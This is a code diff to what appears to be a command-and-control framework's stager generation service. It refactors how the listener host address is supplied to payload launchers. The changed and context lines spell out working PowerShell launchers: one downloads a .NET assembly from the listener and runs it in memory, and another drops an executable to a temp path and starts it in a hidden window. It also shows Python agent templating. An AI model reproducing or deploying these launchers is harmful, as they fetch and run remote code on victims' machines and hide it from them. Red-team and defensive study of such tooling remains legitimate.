@@ -200,12 +200,11 @@ class StagerGenerationService:
                 )
         else:
             hop = ""
-        host = listener.options["Host"]["Value"]
         launcher_front = listener.options["Launcher"]["Value"]
 
         launcher = f"""
         $wc=New-Object System.Net.WebClient;
-        $bytes=$wc.DownloadData("{host}/download/{language}/{hop}");
+        $bytes=$wc.DownloadData("{listener.host_address}download/{language}/{hop}");
         $assembly=[Reflection.Assembly]::load($bytes);
         $assembly.EntryPoint.Invoke($null,$null);
         """
@@ -245,14 +244,13 @@ class StagerGenerationService:
                 )
         else:
             hop = ""
-        host = listener.options["Host"]["Value"]
         launcher_front = listener.options["Launcher"]["Value"]
 
         launcher = f"""
             # Create a temp file path
             $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "{helpers.random_string(length=5)}.exe");
             $wc = New-Object System.Net.WebClient;
-            $url = "{host}/download/{language}/{hop}";
+            $url = "{listener.host_address}download/{language}/{hop}";
             $wc.DownloadFile($url, $tempFilePath);
             Start-Process -FilePath $tempFilePath -WindowStyle Hidden;
         """
@@ -644,8 +642,6 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
         return script.replace("FILE_UPLOAD_FULL_PATH_GOES_HERE", path)
 
     def generate_python_stageless(self, active_listener, language):
-        server = active_listener.options["Host"]["Value"]
-
         if language == "ironpython":
             language = "python"
             version = "ironpython"
@@ -665,7 +661,10 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
                 active_listener.options, language=language, encrypt=False, encode=False
             )
             .replace("exec(agent_code, globals())", "")
-            .replace("stage = Stage()", f"stage = Stage()\nserver='{server}'")
+            .replace(
+                "stage = Stage()",
+                f"stage = Stage()\nserver='{active_listener.host_address}'",
+            )
         )
 
         if active_listener.info["Name"] == "HTTP[S] MALLEABLE":
@@ -730,14 +729,10 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
         kill_date = active_listener.options["KillDate"]["Value"]
         working_hours = active_listener.options["WorkingHours"]["Value"]
         lost_limit = active_listener.options["DefaultLostLimit"]["Value"]
-        if "Host" in active_listener.options:
-            host = active_listener.options["Host"]["Value"]
-        else:
-            host = ""
 
         template_vars = {
             "PROFILE": profile,
-            "HOST": host,
+            "HOST": active_listener.host_address,
             "SESSION_ID": session_id,
             "KILL_DATE": kill_date,
             "WORKING_HOURS": working_hours,
